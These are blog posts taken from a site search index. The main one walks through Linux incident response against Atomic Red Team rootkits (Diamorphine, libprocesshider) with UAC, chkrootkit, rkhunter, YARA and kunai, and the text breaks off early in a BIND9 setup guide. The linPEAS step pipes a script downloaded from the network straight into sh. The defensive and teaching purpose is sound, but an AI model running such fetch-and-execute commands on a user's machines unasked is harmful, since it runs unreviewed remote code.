LDFLAGS=\"-static\" FORCE_UNSAFE_CONFIGURE=1 --disable-xattr --disable-libcap --disable-libsmack --without-selinux --without-gmp\nmake\n</code></pre> <p>You'll find the resulting binaries completely usable, and statically-linked under the project's <code>src/</code> folder. Copy them out to <code>uac</code>'s bin path with the following.</p> PowerShellBash <pre><code># Get an array list of created binaries\ncd ~/src/coreutils-8.32/src\nls | sed -E 's/\\s+/\\n/g' | grep -Pv \"(.c|.o|.h|\\[|README|Makefile|COPYRIGHT|ACKNOWLEDGMENTS|debian)\" | sed -E 's/(^|$)/\"/g' | tr '\\n' ','\n$file_list = @(\"b2sum\",\"base32\",\"base64\",\"basename\",\"blake2\",\"cat\",\"cksum\",\"cp\",\"csplit\",\"cut\",\"date\",\"dd\",\"df\",\"dir\",\"dirname\",\"du\",\"env\",\"expand\",\"expr\",\"false\",\"fmt\",\"getlimits\",\"ginstall\",\"head\",\"id\",\"kill\",\"libver.a\",\"link\",\"ln\",\"ls\",\"make-prime-list\",\"md5sum\",\"mkdir\",\"mktemp\",\"mv\",\"nl\",\"numfmt\",\"od\",\"paste\",\"pinky\",\"pr\",\"printenv\",\"printf\",\"ptx\",\"pwd\",\"readlink\",\"rm\",\"rmdir\",\"seq\",\"single-binary.mk\",\"sleep\",\"split\",\"stat\",\"stty\",\"sum\",\"tail\",\"tee\",\"test\",\"tr\",\"true\",\"tty\",\"uname\",\"unexpand\",\"uniq\",\"unlink\",\"uptime\",\"users\",\"vdir\",\"yes\")\n\nforeach ($file in $file_list) {\n    Copy-Item $file -Destination ~/uac/uac-$uac_version/bin/linux/x86_64\n}\n</code></pre> <pre><code># Get a space-separate string of created binaries\ncd ~/src/coreutils-8.32/src\nls | sed -E 's/\\s+/\\n/g' | grep -Pv \"(.c|.o|.h|\\[|README|Makefile|COPYRIGHT|ACKNOWLEDGMENTS|debian)\" | tr '\\n' ' '\nfile_list='b2sum base32 base64 basename blake2 cat cksum cp csplit cut date dd df dir dirname du env expand expr false fmt getlimits ginstall head id kill libver.a link ln ls make-prime-list md5sum mkdir mktemp mv nl numfmt od paste pinky pr printenv printf ptx pwd readlink rm rmdir seq single-binary.mk sleep split stat stty sum tail tee test tr true tty uname unexpand uniq unlink uptime users vdir yes'\n\nfor file in $file_list\ndo\n    cp \"$file\" ~/uac/uac-$uac_version/bin/linux/x86_64/\ndone\n</code></pre>"},{"location":"blog/2024/07/12/octicons-beaker-16-atomic-red-team-x-unix-artifacts-collector/#binutils","title":"binutils","text":"<p>Check Back Later</p> <p>Unfortunately, the static binaries produced by binutils following the steps below don't seem to work on other machines.</p> <p>At the very least, the strings-static binary that <code>chkrootkit</code> builds will work on other systems (compiled on Ubuntu 22.04, copied to Ubuntu 20.04).</p> <p>This repo is often cited for obtaining the <code>socat</code> static binary. It was used for reference while trying the following build. Similar to the coreutils source code, I had better luck when <code>rm -rf</code> removing the uncompressed folder it downloads, and extracting the <code>binutils_2.38.orig.tar.xz</code> files.</p> PowerShell &amp; Bash <pre><code>cd ~/src\napt-get source binutils\nrm -rf ./binutils-2.38/\ntar -xvf ./binutils_2.38.orig.tar.xz\n\ncd binutils-2.38/\n./configure FORCE_UNSAFE_CONFIGURE=1 --with-static-standard-libraries\nmake\n</code></pre> <p>Without these working on other systems, they were not copied to the <code>uac</code> folder. Lets move on to <code>chkrootkit</code>.</p>"},{"location":"blog/2024/07/12/octicons-beaker-16-atomic-red-team-x-unix-artifacts-collector/#chkrootkit","title":"chkrootkit","text":"<p>All we need to do (according to the README) is run <code>make sense</code>.</p> PowerShell &amp; Bash <pre><code>cd ~/src\napt-get source chkrootkit\ncd ~/src/chkrootkit-0.55/\nmake sense\n</code></pre> <p>You'll find everything built right in the project's main directory. Copy the resulting files to <code>uac</code>'s bin path.</p> PowerShellBash <pre><code># Get an array list of created files\nls | sed -E 's/\\s+/\\n/g' | grep -Pv \"(\\.c|README|Makefile|COPYRIGHT|ACKNOWLEDGMENTS|debian|patch)\" | sed -E 's/(^|$)/\"/g' | tr '\\n' ','\n$file_list = @(\"check_wtmpx\",\"chkdirs\",\"chklastlog\",\"chkproc\",\"chkrootkit\",\"chkrootkit.lsm\",\"chkutmp\",\"chkwtmp\",\"ifpromisc\",\"strings-static\")\n\nforeach ($file in $file_list) {\n    Copy-Item $file -Destination ~/uac/uac-$uac_version/bin/linux/x86_64\n}\n</code></pre> <pre><code># Get a space-separate string of created binaries\nls | sed -E 's/\\s+/\\n/g' | grep -Pv \"(.c|.o|.h|\\[|README|Makefile|COPYRIGHT|ACKNOWLEDGMENTS|debian)\" | tr '\\n' ' '\nfile_list='check_wtmpx chkdirs chklastlog chkproc chkrootkit chkrootkit.lsm chkutmp chkwtmp ifpromisc strings-static'\n\nfor file in $file_list\ndo\n    cp \"$file\" ~/uac/uac-$uac_version/bin/linux/x86_64/\ndone\n</code></pre>"},{"location":"blog/2024/07/12/octicons-beaker-16-atomic-red-team-x-unix-artifacts-collector/#rkhunter","title":"rkhunter","text":"<p>\u26a0\ufe0f TO DO, check back later!</p>"},{"location":"blog/2024/07/12/octicons-beaker-16-atomic-red-team-x-unix-artifacts-collector/#yara","title":"yara","text":"PowerShell + Bash <pre><code>cd ~/src\ngit clone https://github.com/VirusTotal/yara\ncd yara\n</code></pre> <p>Modifying build.sh</p> <p>You'll need to change the <code>build.sh</code> script to target a static binary. ChatGPT saved a lot of time pointing me to a number of options which I narrowed down over trial and error. See the references below for details.</p> <ul> <li>Build a Fully Static <code>unbound</code></li> <li><code>--enable-static</code> vs <code>--disable-shared</code></li> </ul> <pre><code>#!/bin/sh\n\n./bootstrap.sh\n./configure --enable-static --disable-shared\n\nmake LDFLAGS=\"-all-static\"\n</code></pre> <p>You should end up with a static <code>yara</code> binary in the project root.</p> <pre><code>root@host# file yara\nyara: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=6031a7a9a98aea1fe22563543dd7fdae36a7915b, for GNU/Linux 3.2.0, not stripped\n</code></pre> <p></p> <p>Now we can begin collecting evidence.</p>"},{"location":"blog/2024/07/12/octicons-beaker-16-atomic-red-team-x-unix-artifacts-collector/#gathering-artifacts","title":"Gathering Artifacts","text":"<p>The Unix-like Artifacts Collector is an excellent tool for gathering evidence from a non-Windows machine.</p> <p>uac/README</p> <p>UAC is a Live Response collection script for Incident Response that makes use of native binaries and tools to automate the collection of AIX, Android, ESXi, FreeBSD, Linux, macOS, NetBSD, NetScaler, OpenBSD and Solaris systems artifacts. It was created to facilitate and speed up data collection, and depend less on remote support during incident response engagements.</p> <p>What It Can and Can't Do</p> <p>UAC is primarily an evidence collection tool. This isn't something like linpeas that will alert you to possible leads as it's gathering evidence. It's a ton of output, and is a haystack in which you'd be trying to find a very small needle if you didn't already have an idea of what you're looking for. With this in mind, there are a few effective ideas on how to leverage this tool:</p> <ul> <li>Assume you're compromised, hit each endpoint with UAC and pull the resulting evidence back to your IR machine</li> <li>Investigate supsicious activity with system internals, using what you know while UAC runs</li> <li>Use linpeas to assess endpoints, it's not just a hacking tool, it will find IOC's</li> </ul> <p>If you have a possible lead or IOC, then your UAC evidence becomes invaluable. With the evidence back on your IR machine:</p> <ul> <li>You can of course dig into specific evidence based on your potential IOC's</li> <li>You could also use YARA to hit the entire UAC evidence folder for IOC's, which is incredibly fast</li> </ul> <p>More on YARA in this section below.</p> <p>Download and unpack the latest release of <code>uac</code>:</p> PowerShellBash <pre><code>mkdir uac\ncd ./uac/\n\n$author_repo = \"tclahr/uac\"\n$url = \"https://api.github.com/repos/$author_repo/releases/latest\"\n$response_json = Invoke-RestMethod -Uri $url\n$uac_version = ($response_json.name -split '-')[1]\n\n# The $response_json.assets.browser_download_url key will show all available release files as [PSCustomObject] objects\nforeach ($link in $response_json.assets.browser_download_url) {\n    $basename = $link | Split-Path -leaf\n    Write-Host \"Downloading $basename...\"\n    iwr -Uri $link -Out $basename\n}\n\n# https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_split?view=powershell-7.4\n# https://devblogs.microsoft.com/powershell/parsing-text-with-powershell-2-3/\n$file_hash = ((Get-Content ./uac-$uac_version.tar.gz.sha256) -Split ' ')[0]\nif (Get-FileHash ./uac-$uac_version.tar.gz | Select Hash | Select-String $file_hash.ToUpper()) {\n    Write-Host -ForegroundColor Green \"[OK] SHA256SUM\"\n} else {\n    Write-Host -ForegroundColor Red \"[WARNING] SHA256SUM MISMATCH\"\n}\n\ntar -xzvf ./uac-$uac_version.tar.gz\n</code></pre> <pre><code>mkdir uac\ncd ./uac/\n\nAUTHOR_REPO_LIST='tclahr/uac'\n\nTARBALL_FILE='.tar.gz$'\nCHECKSUM_FILE='.sha256$'\n\nfor AUTHOR_REPO in $AUTHOR_REPO_LIST\ndo\n    ARTIFACTS=$(curl -s https://api.github.com/repos/\"$AUTHOR_REPO\"/releases/latest | awk -F '\"' '/browser_download_url/{print $4}')\n    for URL in $ARTIFACTS\n    do\n        ARCHIVE=$(basename \"$URL\")\n        # Download files first\n        echo \"[*]Downloading $ARCHIVE...\"\n        curl --silent -L \"$URL\" --output \"$ARCHIVE\"\n        # Check the sha256sum\n        if [[ \"$ARCHIVE\" =~ \"$CHECKSUM_FILE\" ]]; then\n            if (sha256sum -c \"$ARCHIVE\"); then\n                echo \"[OK] SHA256SUM\"\n            else\n                echo \"[WARNING] SHA256SUM MISMATCH\"\n                exit 1\n            fi\n        fi\n        # Unpack the archive\n        if [[ ! \"$ARCHIVE\" =~ $IGNORE_LIST ]]; then\n            tar -xzvf ./uac-$uac_version.tar.gz\n        fi\n    done\ndone\n</code></pre> <p>You can list all the artifacts <code>uac</code> can obtain with:</p> PowerShell &amp; Bash <pre><code>cd uac-$uac_version\n./uac --artifacts list\n</code></pre> <p>Run it, collecting all artifacts based on the incident response profile:</p> PowerShell &amp; Bash <pre><code>./uac -p ir_triage ./results\n</code></pre> <p>Run it, specifying artifacts to collect:</p> <p>Choosing Your Focus</p> <p>This selecton of artifacts focuses on producing information that can point us to a rootkit.</p> PowerShellBash <pre><code>mkdir results\n\n$artifacts_list = 'chkrootkit/chkrootkit.yaml,\nlive_response/system/ebpf.yaml,\nlive_response/system/kernel_modules.yaml,\nlive_response/system/modinfo.yaml,\nlive_response/system/lsmod.yaml,\nlive_response/system/hidden_files.yaml,\nlive_response/system/sys_modules.yaml,\nlive_response/hardware/dmesg.yaml,\nlive_response/process/strings_running_processes.yaml,\nlive_response/process/procstat.yaml'\n\n./uac -a $artifacts_list.Replace(\"`n\",\"\") ./results\n</code></pre> <pre><code>mkdir results\n\nartifacts_list='chkrootkit/chkrootkit.yaml,\nlive_response/system/ebpf.yaml,\nlive_response/system/kernel_modules.yaml,\nlive_response/system/modinfo.yaml,\nlive_response/system/lsmod.yaml,\nlive_response/system/hidden_files.yaml,\nlive_response/system/sys_modules.yaml,\nlive_response/hardware/dmesg.yaml,\nlive_response/process/strings_running_processes.yaml,\nlive_response/process/procstat.yaml'\n\n./uac -a $(echo \"$artifacts_list\" | tr '\\n' ' ' | sed -E 's/\\s+//g') ./results\n</code></pre> <p></p> <p>Next Steps</p> <p>While UAC is running on one or all of your endpoints, we can begin looking for IOC's and suspicious activity.</p>"},{"location":"blog/2024/07/12/octicons-beaker-16-atomic-red-team-x-unix-artifacts-collector/#initial-assessment","title":"Initial Assessment","text":"<p>You will get further ahead by performing an initial triage of the system's internals while UAC is gathering artifacts in the background.</p> <p>The Scenario, the Scope</p> <p>Scenario: In this case we control all of the variables. If you followed along it's a basic cloud / server environment with default logging, and default system state (aside from a few extra packages).</p> <p>Scope: In this case we have minimal visibiltiy, no auditd or sysmonforlinux logs, and no endpoint agent. We need to find the malicious activity with little to go on other than system internals.</p> <p>\ud83d\udcdd Our IR to do list:</p> <ul> <li>\u2705 Run UAC in the background and collect artifacts, exfiltrate artifacts when done</li> <li>\ud83d\udfe6 System activity (LastWriteTime / mtime) <code>chkrootkit</code>, <code>rkhunter</code>, <code>linpeas</code>, <code>lsof</code>, <code>ss</code>/<code>netstat</code>, <code>ps</code> for initial triage</li> <li>\ud83d\udfe6 Parse and pivot with YARA, observe with kunai, UAC produces a ton of info, how do you know what to look for?</li> <li>\ud83d\udfe6 Run UAC across your inventory and check for the same artifacts</li> </ul>"},{"location":"blog/2024/07/12/octicons-beaker-16-atomic-red-team-x-unix-artifacts-collector/#linpeas","title":"linPEAS","text":"<p>This should be the first thing you do on an endpoint (whether you're pentesting it or threat hunting):</p> <ul> <li>Execute it in memory</li> <li>Pipe the output to a log file</li> <li>Send it to the background to continue working</li> <li>Review it when it's done running</li> </ul> PowerShell + Bash <pre><code>cd /dev/shm\ncurl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh | tee linpeas.log &gt; /dev/null &amp;\n</code></pre> <p>It turns out linpeas is great at finding suspicious activity in a semi-interactive way. The output is better suited to manually reviewing what's happening. It shouldn't be a surprise that linpeas was able to find evidence of the Diamorphine rootkit in <code>dmesg</code> by looking for kernel modules that failed signature verification.</p> <p></p>"},{"location":"blog/2024/07/12/octicons-beaker-16-atomic-red-team-x-unix-artifacts-collector/#system-internals","title":"System Internals","text":"<p>Similar to Microsoft's Sysinternals, knowing how the system works even at a basic level is likely going to lead us to something.</p> <p>Since we have <code>chkrootkit</code> and <code>rkhunter</code> with us, run those to look for low hanging fruit.</p> <p>The screenshots below were taken using the system's binaries, however the chkrootkit compiled statically does work. rkhunter still needs tested.</p>"},{"location":"blog/2024/07/12/octicons-beaker-16-atomic-red-team-x-unix-artifacts-collector/#chkrootkit_1","title":"chkrootkit","text":"PowerShell + Bash <pre><code>chkrootkit -q\n</code></pre> <p><code>chkrootkit</code> was able to find the leftover shared object file from the libprocesshider technique (T1014-3).</p> <p></p>"},{"location":"blog/2024/07/12/octicons-beaker-16-atomic-red-team-x-unix-artifacts-collector/#rkhunter_1","title":"rkhunter","text":"PowerShell + Bash <pre><code>rkhunter --sk --rwo --check\n</code></pre> <p><code>rkhunter</code> also identifies both libprocesshider (T1014-3) and Diamorphine (T1014-4).</p> <p></p> <p>Use Multiple Tools</p> <p>Interestingly the way UAC runs chkrootkit, it fails to find either Diamorphine, or libprocesshider.</p> <pre><code>chkrootkit -n -r -x\n</code></pre> <p></p> <p>This is a good example of using multiple tools to validate your findings. One tool may miss something, some of the time.</p> <p>Knowing how a tool works and what to look for when it doesn't is just as important as knowing your system internals.</p>"},{"location":"blog/2024/07/12/octicons-beaker-16-atomic-red-team-x-unix-artifacts-collector/#filesystem","title":"Filesystem","text":"<p>In this case, both rootkits hide themselves from the process listing (<code>ps axjf</code>) and aren't performing any real network-based C2-like actions. Imagine they ping home once every two days to remain in place undetected. With that in mind, we can begin our search.</p> <p>Hunting Suspicious Activity</p> <p>While it's possible attackers hide their tracks on the filesystem, sorting files by their modification time (especially in paths like <code>/etc</code>, <code>/usr/local/bin</code>, or <code>/boot</code>) can point to suspicious activity. Some of those paths should have files that rarely change without an administrator performing the update in an expected way or time.</p> <p>The first stops you should make in the filesystem are:</p> <pre><code>/etc\n/boot\n/home\n/root\n/usr (includes /bin, /sbin)\n/bin (if not linked under /usr)\n/sbin (if not linked under /usr)\n/tmp\n/var/tmp\n/dev/shm\n/var/www/\n/srv\n/opt\n</code></pre> <p>Past that you could be looking in more specific places. For instance it may make more sense to take a memory dump instead of scanning <code>/proc/[0-9]+</code>.</p> <p>Search <code>/etc</code> recursively for the most recently modified files:</p> PowerShellBash <pre><code>gci -Path /etc -Recurse -Force -File | Sort-Object -Property LastWriteTime -Descending | Select -First 10\n</code></pre> <pre><code># find works a little differently than PowerShell's gci\n# -cmin -X/ -ctime -X returns all files modified more recently than -X\n# -cmin works in -X minutes\n# -ctime works in -X days\n# X must have a minus - prepended to it\n# ctime/min means file status changes, like inode, which includes content\n# mtime/min means the file content itself changed\nfind /etc -mmin -360 -ls 2&gt;/dev/null | awk '{print $10, \" \", $11}' | sort -k 1 -nr | head\nfind /etc -mtime -1 -ls 2&gt;/dev/null | awk '{print $10, \" \", $11}' | sort -k 1 -nr | head\n</code></pre> <p>With this technique we catch the /etc/ld.so.preload file's modification. This is a critical file to keep in mind for shared object hijacking.</p> <p></p> <p>Repeating the same for <code>/tmp</code>, we can pick out leftover artifacts from the atomic test compiling Diamorphine.</p> <p></p> <p>Finally jumping into the <code>/usr</code> path, we can find exactly where these rootkits found their home on the filesystem.</p> <p>PowerShell Syntax</p> <p>Wrapping the command like <code>(this).FullName</code> will return the FullName (aka file path, and only the file path) of the resulting objects.</p> <p></p> <p>The Scenario, Continued</p> <p>\ud83d\udcdd Our IR to do list:</p> <ul> <li>\u2705 Run UAC in the background and collect artifacts, exfiltrate artifacts when done</li> <li>\u2705 System activity (LastWriteTime / mtime) <code>chkrootkit</code>, <code>rkhunter</code>, <code>linpeas</code>, <code>lsof</code>, <code>ss</code>/<code>netstat</code>, <code>ps</code> for initial triage</li> <li>\ud83d\udfe6 Parse and pivot with YARA, observe with kunai, UAC produces a ton of info, how do you know what to look for?</li> <li>\ud83d\udfe6 Run UAC across your inventory and check for the same artifacts</li> </ul>"},{"location":"blog/2024/07/12/octicons-beaker-16-atomic-red-team-x-unix-artifacts-collector/#yara_1","title":"YARA","text":"<p>YARA is effectively a swiss army knife of malware identification. This includes actively hunting for malware on systems.</p> <p>yara/README</p> <p>YARA is a tool aimed at (but not limited to) helping malware researchers to identify and classify malware samples. With YARA you can create descriptions of malware families (or whatever you want to describe) based on textual or binary patterns. Each description, a.k.a. rule, consists of a set of strings and a boolean expression which determine its logic.</p> <p>To do this, you need a rule file to feed YARA, so it knows what to look for.</p> <p>YARA Rules</p> <p>See the YARA documentation on how to create YARA rules.</p> <p>InQuest/awesome-yara is a comprehensive list of resources for rules and YARA-based tools.</p> <p>Two that stand out that we could begin to reference:</p> <ul> <li>Neo23x0/signature-base</li> <li>Yara-Rules/rules</li> </ul> <p>The more rules, and the more complex each rule file is, the longer it will take to scan a target.</p> <p>We can start with Neo23x0/god-mode-rules as a base, which is primarily for Windows, but looking at it we can think of how we could convert this to work with Linux to catch common payloads.</p> <p>For the sake of this demo, we'll add the following lines to the bottom of <code>godmode.yar</code> to look for what we've already determined to be on our comrpomised system.</p> <pre><code>&lt;SNIP&gt;\n      $ = \"diamorphine\" ascii\n      $ = \"libprocesshider\" ascii\n   condition:\n      1 of them\n}\n</code></pre> <p>On the Target</p> <p>Scan with YARA:</p> PowerShell + Bash <pre><code>sudo apt install -y yara\ncurl -LfO 'https://github.com/Neo23x0/god-mode-rules/raw/master/godmode.yar'\n# modify godmode.yar\n\n# Try usual folders\nyara ./godmode.yar -r /tmp\nyara ./godmode.yar -r /usr\nyara ./godmode.yar -r /home\nyara ./godmode.yar -r /root\nyara ./godmode.yar -r /etc\n</code></pre> <p>You'll find <code>yara</code> is incredibly fast at pulling signatures from binaries and files. This returned a few more files in <code>/usr/lib/modules</code> that we may not have suspected before, as well as of course our PowerShell history.</p> <p></p> <p>Being Thorough</p> <p>This should underline the importance of being thorough with searching a system, even if your belive you've identified the obvious implant.</p> <p><code>modules.dep</code> and <code>modules.dep.bin</code> were among other files that came back in our filesystem search. These blended in with the other files, but YARA identified that they contained the string <code>diamorphine</code>.</p> <p>In a real scenario, unless you have time to reverse engineer, you're taking the system(s) offline and wiping them once evidence is collected. To continue the investigation, you'd want to try and fully understand the rootkit's capabilties. What else could it have possibly done or hidden from our investigative tools? Is this rootkit just a distraction? It's also important to know enough to determine that it didn't find its way into your backups, reviving it unintentionally during the restore process.</p> <p>Running against <code>/etc</code> also confirms libprocesshider's existence in the <code>ld.so.preload</code> file.</p> <p></p> <p>Scanning Live Processes</p> <p>Scanning all running processes on Windows is possible with YARA and PowerShell. While it's possible to script this out to do the same on Linux, in my tests it appears to hang up on the first process. There's likely something happening under the hood that is causing it to scan infinitely.</p> Bash <pre><code># Try all running processes\nlive_processes=$(find /proc -maxdepth 1 -regex '/proc/[0-9]+')\nfor process in $(echo $live_processes); do echo \"Scanning $process...\" ; yara ./godmode.yar -r \"$process\"; done\n</code></pre> <p>On the UAC Results</p> <p>One of the most effective ways of parsing through your UAC evidence folder is with YARA. It will be able to look in all of the compressed strings files as well, for potential signatures.</p> PowerShell + Bash <pre><code>yara /tmp/godmode.yar -r ./results/\n</code></pre> <p></p>"},{"location":"blog/2024/07/12/octicons-beaker-16-atomic-red-team-x-unix-artifacts-collector/#kunai","title":"Kunai","text":"<p>Kunai is a fairly new project leveraging eBPF to replicate what <code>sysmonforlinux</code> does. It was covered in a recent SANS diary, and appears to run using a single standalone binary. This alone makes it worth checking out, especially showing up to systems without <code>auditd</code> or <code>sysmonforlinux</code> installed.</p> <p>kunai/README</p> <p>The goal behind this project is to bring relevant events to achieve various monitoring tasks ranging from security monitoring to Threat Hunting on Linux based systems. If you are familiar with Sysmon on Windows, you can think of Kunai as being a Sysmon equivalent for Linux.</p> <p>There are amd64, and aarch64 binaries available. Pull the latest release files with the following:</p> PowerShellBash <pre><code>mkdir kunai\ncd ./kunai/\n\n$author_repo = \"kunai-project/kunai\"\n$url = \"https://api.github.com/repos/$author_repo/releases/latest\"\n$response_json = Invoke-RestMethod -Uri $url\n$uac_version = ($response_json.name -split '-')[1]\n\n# The $response_json.assets.browser_download_url key will show all available release files as [PSCustomObject] objects\nforeach ($link in $response_json.assets.browser_download_url) {\n    $basename = $link | Split-Path -leaf\n    Write-Host \"Downloading $basename...\"\n    iwr -Uri $link -Out $basename\n}\n\n# https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_split?view=powershell-7.4\n# https://devblogs.microsoft.com/powershell/parsing-text-with-powershell-2-3/\n$file_hash = ((Get-Content ./sha512.txt) -Split ' ')[0]\nif (Get-FileHash -Algorithm SHA512 ./kunai-* | Select Hash | Select-String $file_hash.ToUpper()) {\n    Write-Host -ForegroundColor Green \"[OK] SHA256SUM\"\n} else {\n    Write-Host -ForegroundColor Red \"[WARNING] SHA256SUM MISMATCH\"\n}\n</code></pre> <pre><code>mkdir kunai\ncd ./kunai/\n\nAUTHOR_REPO_LIST='kunai-project/kunai'\n\nif [[ $(uname -m) == 'x86_64' ]]; then\n    EXECUTABLE_FILE='kunai-amd64'\nelse\n    EXECUTABLE_FILE=\"kunai-$(uname -m)\"\nfi\n\nCHECKSUM_FILE='sha512.txt'\n\nfor AUTHOR_REPO in $AUTHOR_REPO_LIST\ndo\n    ARTIFACTS=$(curl -s https://api.github.com/repos/\"$AUTHOR_REPO\"/releases/latest | awk -F '\"' '/browser_download_url/{print $4}')\n    for URL in $ARTIFACTS\n    do\n        ARCHIVE=$(basename \"$URL\")\n        # Download files first\n        if [[ \"$ARCHIVE\" =~ ^($CHECKSUM_FILE|$EXECUTABLE_FILE)$ ]]; then\n            echo \"[*]Downloading $ARCHIVE...\"\n            curl --silent -L \"$URL\" --output \"$ARCHIVE\"\n        fi\n    done\ndone\n# Check the sha512sum\nif (sha512sum -c \"$CHECKSUM_FILE\" --ignore-missing); then\n    echo \"[OK] SHA512SUM\"\nelse\n    echo \"[WARNING] SHA512SUM MISMATCH\"\n    exit 1\nfi\n</code></pre> <p>Rules</p> <p>Kunai has two types of rules: detection, and filtering. They essentially function the same, with detection rules working best as a rule that lives on a system to create alerts, where filtering seems more suited for the manual investigation of a system. For simplicity we'll focus on filtering.</p> <p>Rules are YAML files. The example below copies the sample filtering rule from the documentation, with a few comments added for context and filtering out <code>sshd</code> events in our case (with PSRemoting over SSH it will flood your screen).</p> <pre><code>name: log.execve_connect\nparams:\n    # flag to set so that the rule is used as a filter\n    filter: true\nmatch-on:\n    events:\n        # event id's, these are found under info.event.id\n        # think of them as the sysmon event id equivalent\n        # https://why.kunai.rocks/docs/events/generalities\n        # list of id's to report on (execve=1, connect=60)\n        kunai: [ 1,60 ]\nmatches:\n    # exe matches regex\n    $sshd_connection: .data.exe.file ~= '/usr/sbin/sshd'\n# if exe is NOT sshd, then report event to stdout\ncondition: not $sshd_connection\n</code></pre> <p>Usage</p> <p>Running kunai we can see how it will detect our hidden process.</p> <pre><code>chmod +x ./kunai-amd64\nsudo ./kunai-amd64 -r rules.yml | jq\n</code></pre> <p>This will allow us to visualize the process hiding from <code>ps</code>.</p> <p></p> <p>Which is caught by kunai.</p> <p></p>"},{"location":"blog/2024/07/12/octicons-beaker-16-atomic-red-team-x-unix-artifacts-collector/#evidence-collection","title":"Evidence Collection","text":"<p>UAC has a number of options to retrieve and send the evidence once it's collected.</p> <p>Aside from the deploy_uac Ansible role mentioned up top, much of this is hands-on-keyboard, which is often necessary to begin and dig deeper into a scenario. Doing this at any sort of scale may require more than Ansible and scripting. You may need an agent to actively collect and run assessments on the targets.</p> <p>Interestingly any C2 like sliver could achieve this, and possibly even stay under the radar if deployed correctly when adversaries are monitoring processes. However two projects exist specifically for IR usage.</p> <p>Agent-based Collection</p> <p>Two projects are worth mentioning that specialize in this, and include built in <code>yara</code> scanning on endpoints:</p> <ul> <li>google/grr</li> <li>Velocidex/velociraptor</li> </ul> <p>Ideally this post will be updated once both are installed and tested in a lab.</p> <p>At this point in the IR journey, if you already haven't done so, the next course of action is collecting artifacts from every possibly affected endpoint, and reviewing them for simialr IOC's to those you've already found.</p> <p>The Scenario, Concluded</p> <p>\ud83d\udcdd Our IR to do list:</p> <ul> <li>\u2705 Run UAC in the background and collect artifacts, exfiltrate artifacts when done</li> <li>\u2705 System activity (LastWriteTime / mtime) <code>chkrootkit</code>, <code>rkhunter</code>, <code>linpeas</code>, <code>lsof</code>, <code>ss</code>/<code>netstat</code>, <code>ps</code> for initial triage</li> <li>\u2705 Parse and pivot with YARA, observe with kunai, UAC produces a ton of info, how do you know what to look for?</li> <li>\ud83d\udfe6 Run UAC across your inventory and check for the same artifacts</li> </ul>"},{"location":"blog/2024/07/19/material-dns-bind9-dns/","title":"BIND9 DNS","text":"<p>How to install, maintain, and run a BIND9 DNS server (<code>named</code>). Covers building from source, configuring, hardening, and DNS over TLS as well as DNSSEC.</p> <p>BIND (Berkeley Internet Name Domain) is a complete, highly portable implementation of the Domain Name System (DNS) protocol.</p> <ul> <li>Website</li> <li>Git</li> <li>ISC BIND9 Knowledge Base</li> <li>Administrator Reference Manual</li> </ul> <p>In a few cases, to have a better understanding of what's required when managing and working with <code>bind</code> / <code>named</code>, the documentation is spread across various platforms and git issue trackers; each with their own subtle differences. This guide tries to put some of that together in a useful sequence. Both Ubuntu and Fedora are touched on in each section, but this is primarily written from the perspective of building bind from scratch, without any pre-existing binaries, service files, mandatory access controls, or configurations, and installing it on Ubuntu.</p>"},{"location":"blog/2024/07/19/material-dns-bind9-dns/#install","title":"Install","text":"<p>BIND9  Documentation: Installing and upgrading BIND</p> UbuntuFedoraSource <p>Ensure your firewall is configured (the defaults will allow external DNS access).</p> <pre><code>sudo ufw status verbose\nsudo iptables -S\nsudo ip6tables -S\n</code></pre> <p>Installing through <code>apt</code> preconfigures everything, the systemd service file, chroot, and apparmor.</p> <pre><code>sudo apt update; sudo apt install -y bind9\n\n# Stop, disable systemd-resolved\nsudo systemctl disable systemd-resolved.service\nsudo systemctl stop systemd-resolved.service\n\n# Start, enable bind\nsudo systemctl enable bind\nsudo systemctl start bind\n\n# Confirm apparmor confinement\nsudo aa-status | grep named\n\n# Dump version information\n/usr/sbin/named -V\n</code></pre> <p>Ensure your firewall is configured (the defaults won't allow external DNS access).</p> <pre><code>sudo firewall-cmd --list-all\n</code></pre> <p>Installing through <code>dnf</code> preconfigures everything, the systemd service file, chroot, and selinux.</p> <pre><code>sudo dnf install -y bind\n\n# Stop, disable systemd-resolved\nsudo systemctl disable systemd-resolved.service\nsudo systemctl stop systemd-resolved.service\n\n# Start, enable named\nsudo systemctl enable named\nsudo systemctl start named\n\n# Confirm selinux status\ngetsebool -a | grep named\n\n# Dump version information\n/usr/sbin/named -V\n</code></pre> <p>When cloning the source from git, instructions for building BIND9 are located under main/doc/arm/build.inc.rst.</p> <p>You have a few options when building to install or upgrade BIND9:</p> <ul> <li>Running the new binaries from their new paths based on <code>--prefix=/usr/local</code> (difficult, system-wide changes)</li> <li>Script replacing the existing binaries with new versions (stop <code>named</code>, replace / upgrade, restart <code>named</code>)</li> <li>Recommended: Symlink the to the new <code>bin/</code> and <code>sbin/</code> paths (good for version changes and testing)</li> </ul> <p>For other features available when building, a small txt report is printed to screen after the build completes. Some essentials might include DNSSEC support through the openssl development package. Same for improved performance with the jemalloc development package.</p> <p>Install the required packages.</p> <pre><code># Install required dev packages (ubuntu)\nsudo apt install -y make autoconf automake libtool libuv1-dev libcap-dev libssl-dev libxml2-dev libjson-c-dev libjemalloc-dev libnghttp2-dev liburcu-dev dns-root-data\n\n# Install required dev packages (fedora)\nsudo dnf install -y autoconf automake libtool libuv-devel libcap-devel openssl-devel libxml2-devel json-c-devel jemalloc-devel libnghttp2-devel userspace-rcu-devel\n</code></pre> <p>Clone the source, checkout a specific version.</p> <pre><code>mkdir ~/src\ncd ~/src\ngit clone https://gitlab.isc.org/isc-projects/bind9.git\ncd bind9\ngit tag               # choose a version tag\nversion='stable'      # leave off the 'v' if using a numbered version\ngit checkout $version # prepend the 'v' if using a numbered version\n</code></pre> <p>Build and <code>make install</code> using a unique local prefix path. This way you can build and maintain different versions.</p> <p>Build Options</p> <p>The option <code>--sysconfdir</code> can be specified to set the directory where configuration files such as <code>named.conf</code> go by default; <code>--localstatedir</code> can be used to set the default parent directory of <code>run/named.pid</code>. <code>--sysconfdir</code> defaults to <code>$prefix/etc</code> and <code>--localstatedir</code> defaults to <code>$prefix/var</code>.</p> <p>Build Options Continued</p> <p>Basically, on Ubuntu we can use <code>--sysconfdir=/etc/bind --localstatedir='/var'</code>, since <code>/var/run</code> is a symlink to <code>/run</code>.</p> <p>It's entirely up to you if you would like to 